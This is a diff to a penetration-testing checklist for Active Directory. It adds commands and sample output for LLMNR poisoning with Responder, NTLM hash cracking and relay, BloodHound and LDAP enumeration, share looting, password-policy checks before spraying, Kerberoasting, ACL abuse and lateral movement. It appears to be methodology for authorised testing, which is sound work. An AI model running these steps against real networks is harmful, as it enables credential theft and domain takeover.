@@ -90,7 +90,7 @@ sudo responder -I eth0 -A
 
 <mark style="color:$primary;">**What it means:**</mark> a workstation is looking for a name with no DNS record (typo'd share, decommissioned host). In active mode you would answer as that host and the client would authenticate to you.
 
-<mark style="color:$primary;">**Next:**</mark> if you see requests, drop 'analyze mode' and poison for real > _User Foothold › Responder / Inveigh Capture_. Separately, build a relay target list of hosts **without** SMB signing: `nxc smb 10.10.10.0/24 --gen-relay-list relay.txt`.
+<mark style="color:$primary;">**Next:**</mark> if you see requests, drop 'analyze mode' and poison for real: _User Foothold › Responder / Inveigh Capture_. Separately, build a relay target list of hosts **without** SMB signing: `nxc smb 10.10.10.0/24 --gen-relay-list relay.txt`.
 
 * [ ] Complete
 {% endstep %}
@@ -313,7 +313,7 @@ sudo responder -I eth0
 hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt
 ```
 
-If it won't crack and the target host lacks SMB signing, relay it instead > next step.
+If it won't crack and the target host lacks SMB signing, relay it instead (see next step).
 
 * [ ] Complete
 {% endstep %}
@@ -321,7 +321,7 @@ If it won't crack and the target host lacks SMB signing, relay it instead > next
 {% step %}
 #### NTLM Relay (if SMB signing disabled)
 
-If a captured/coerced auth won't crack, relay it to a host that doesn't require SMB signing. See ntlm-relay-and-coercion-attacks.
+If a captured/coerced auth won't crack, relay it to a host that doesn't require SMB signing. See [ntlm-relay-and-coercion-attacks.md](../field-manual/exploitation/initial-access/ntlm-relay-and-coercion-attacks.md "mention").
 
 ```bash
 ntlmrelayx.py -tf relay.txt -smb2support
@@ -398,21 +398,65 @@ SMB  10.10.10.5  445  DC01  [+] domain.local\svc_sql:Season2025! (Pwn3d!)
 
 {% stepper %}
 {% step %}
-#### Bloodhound
+#### BloodHound Collection
 
-Run [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention") with discovered credentials.
+Run [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention") with your creds to map every attack path at once.
+
+```bash
+bloodhound-python -u user -p 'pass' -d domain.local -ns <dc-ip> -c all --zip
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> a clean collection (counts for users/computers/groups). Then import the zip and run **Shortest Paths to Domain Admins** and mark your account **Owned**.
+
+```
+INFO: Found 42 users, 15 computers, 51 groups
+INFO: Compressing output into 20250105_bloodhound.zip
+```
+
+<mark style="color:$primary;">**Next:**</mark> every later step ("abusable ACLs", "lateral-movement rights", "Kerberoastable") is answered from this graph - keep it open.
+
+See also tool exploitation: [bloodhound.md](../toolbox/tooling/exploitation-tools/bloodhound.md "mention").
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
 #### LDAP Domain Dump
 
-Use `ldapdomaindump` to identify all domain joined computers.
+Use `ldapdomaindump` for a quick browsable HTML inventory of users, groups and computers.
+
+```bash
+ldapdomaindump -u 'domain.local\user' -p 'pass' <dc-ip> -o ldapdump/
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> open `domain_computers.html` for the host list, `domain_users.html` for account flags (disabled, pwd-not-required, SPN set).
+
+<mark style="color:$primary;">**Next:**</mark> cross-reference high-value computers (servers, SQL, Exchange) with [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention") targets.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
 #### Share Enumeration
 
-Enumerate accessible shares on servers with [crackmapexec.md](../toolbox/tooling/post-exploitation/crackmapexec.md "mention"), [smbmap.md](../toolbox/tooling/information-gathering/service-enumeration/smbmap.md "mention"), [powerview.md](../toolbox/tooling/post-exploitation/powersploit/powerview.md "mention") or [snaffler.md](../toolbox/tooling/post-exploitation/snaffler.md "mention").
+Enumerate shares with [crackmapexec.md](../toolbox/tooling/post-exploitation/crackmapexec.md "mention"), [smbmap.md](../toolbox/tooling/information-gathering/service-enumeration/smbmap.md "mention"), [powerview.md](../toolbox/tooling/post-exploitation/powersploit/powerview.md "mention") or [snaffler.md](../toolbox/tooling/post-exploitation/snaffler.md "mention").
+
+```bash
+nxc smb <target> -u user -p 'pass' --shares
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> **non-default** shares and anywhere you have `WRITE`. Readable SYSVOL/NETLOGON can hold scripts with creds; writable shares enable coercion/relay tricks.
+
+```
+SHARE      PERMISSIONS   REMARK
+SYSVOL     READ          Logon server share
+Dev$       READ,WRITE
+Backups    READ
+```
+
+<mark style="color:$primary;">**Next:**</mark> loot readable shares for configs, scripts and keys - run [snaffler.md](../toolbox/tooling/post-exploitation/snaffler.md "mention") to automate the credential hunt.
+
+* [ ] Complete
 {% endstep %}
 {% endstepper %}
 
@@ -420,52 +464,152 @@ Enumerate accessible shares on servers with [crackmapexec.md](../toolbox/tooling
 
 {% stepper %}
 {% step %}
-#### Bloodhound
+#### BloodHound Collectors
 
-Run Bloodhound with discovered credentials
+Collect with the method that suits your position - [bloodhound.py.md](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/bloodhound.py.md "mention") from Linux, [sharphound.md](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/sharphound.md "mention") from a Windows foothold.
 
-1. Bloodhound.py
-2. Bloodhound from windows
+```bash
+bloodhound-python -u user -p 'pass' -d domain.local -ns <dc-ip> -c all --zip
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> a successful collection against the DC; re-run after every new credential so the graph reflects your current access.
+
+<mark style="color:$primary;">**Next:**</mark> re-mark newly owned principals and re-check paths to DA.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
 #### Password Policy Enumeration
 
-Gather the domain password policy using the discovered credentails
+Pull the policy and build a privileged-user list. See [password-policy.md](../field-manual/intelligence/windows-domain-enumeration/password-policy.md "mention").
 
-1. Gather a list of Domain Admins or Privileged users using tools:
-   1. Windapsearch
-   2. powerview
-   3. bloodhound
-   4. ad powershell module
+```bash
+nxc smb <dc-ip> -u user -p 'pass' --pass-pol
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> **lockout threshold** (governs spray cadence), min length, and complexity - these tell you how aggressively you can spray.
+
+```
+Minimum password length: 7
+Account Lockout Threshold: 5
+Account Lockout Duration: 30 minutes
+```
+
+<mark style="color:$primary;">**Next:**</mark> with the threshold known, time any further spraying safely (e.g. 1 attempt / 31 min if threshold is 5).
+
+* [ ] Complete
 {% endstep %}
 {% endstepper %}
 
-### Foothold Enumeration
+***
+
+## Foothold Enumeration
 
 {% stepper %}
 {% step %}
-Enumerate security controls.
+#### Enumerate Security Controls
+
+Identify AV/EDR, AppLocker and PowerShell Constrained Language Mode before attempting to run anything.
+
+```bash
+nxc smb <target> -u user -p 'pass' -M enum_av
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> which product is present - this dictates whether we can drop binaries or must live off the land.
+
+```
+ENUM_AV  10.10.10.60  Found Windows Defender
+```
+
+<mark style="color:$primary;">**Next:**</mark> pick tooling accordingly (obfuscated/LOLBAS if EDR present).
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Look for other logged-in users using CME.
+#### Find Logged-on Users
+
+Map where privileged users are logged on with [netexec.md](../toolbox/tooling/exploitation-tools/netexec.md "mention") - this is how you choose lateral-movement targets.
+
+```bash
+nxc smb <targets> -u user -p 'pass' --loggedon-users
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> a Domain Admin session on a host you can reach - a target for credential/token theft.
+
+```
+SMB  10.10.10.60  FILE01  [+] Enumerated loggedon users
+SMB  10.10.10.60  FILE01  DOMAIN\admin  (logged on)
+```
+
+<mark style="color:$primary;">**Next:**</mark> if a DA is logged on where you have (or can get) admin, that host becomes your escalation target > dump LSASS / steal token.
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Look for Kerberoastable accounts.
+#### Identify Kerberoastable Accounts
+
+List accounts with an SPN - these are Kerberoastable. See [kerberoasting](../field-manual/post-exploitation/privilege-escalation-1/kerberoasting/ "mention").
+
+```bash
+impacket-GetUserSPNs domain.local/user:'pass' -dc-ip <dc-ip>
+```
+
+<mark style="color:$primary;">**What to look for:**</mark> service accounts in the result, especially members of privileged groups (shown in the `MemberOf` column).
+
+```
+ServicePrincipalName    Name       MemberOf
+MSSQLSvc/sql01:1433      svc_sql    CN=Domain Admins,...
+```
+
+<mark style="color:$primary;">**What it means:**</mark> a Kerberoastable account _in Domain Admins_ is a potential straight line to domain compromise if its password is weak.
+
+<mark style="color:$primary;">**Next:**</mark> request and crack the ticket: [exploitation](../field-manual/exploitation/ "mention") _›_ [kerberoasting](../field-manual/post-exploitation/privilege-escalation-1/kerberoasting/ "mention").
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Look at owned users for abusable ACL entries.
+#### Review Owned Users for Abusable ACLs
+
+In [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention"), select each owned principal > **Outbound Object Control**. See [dacl-acl-abuse.md](../field-manual/exploitation/initial-access/dacl-acl-abuse.md "mention").
+
+<mark style="color:$primary;">**What to look for:**</mark> edges like `ForceChangePassword`, `GenericAll`, `GenericWrite`, `WriteDACL`, `AddMember`, `Owns` pointing at higher-value objects.
+
+```
+svc_sql --[GenericAll]--> GPO_Admins group
+svc_sql --[ForceChangePassword]--> helpdesk_admin
+```
+
+<mark style="color:$primary;">**What it means:**</mark> each edge is a concrete escalation - e.g. `GenericAll` on a group lets you add yourself to it.
+
+<mark style="color:$primary;">**Next:**</mark> execute the matching abuse: [exploitation](../field-manual/exploitation/ "mention") _›_ [dacl-acl-abuse.md](../field-manual/exploitation/initial-access/dacl-acl-abuse.md "mention").
+
+* [ ] Complete
 {% endstep %}
 
 {% step %}
-Check bloodhound for CanRDP, CanPSRemote, or SQLAdmin abilities for lateral movement.
+#### Check Lateral-Movement Rights
+
+In [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention"), check owned users for `CanRDP`, `CanPSRemote`, `ExecuteDCOM` or `SQLAdmin` edges. See [lateral-movement.md](../field-manual/post-exploitation/lateral-movement.md "mention").
+
+<mark style="color:$primary;">**What to look for:**</mark> an execution edge from an owned user to a host you haven't accessed yet.
+
+```
+jdoe --[CanPSRemote]--> FILE01.domain.local
+```
+
+<mark style="color:$primary;">**Next:**</mark> use the right tool for the edge - `CanPSRemote` > evil-winrm; `CanRDP` > `xfreerdp` - and move to that host.
+
+* [ ] Complete
 {% endstep %}
 {% endstepper %}
 
-### Pivoting
+***
+
+## Pivoting
 
 {% stepper %}
 {% step %}
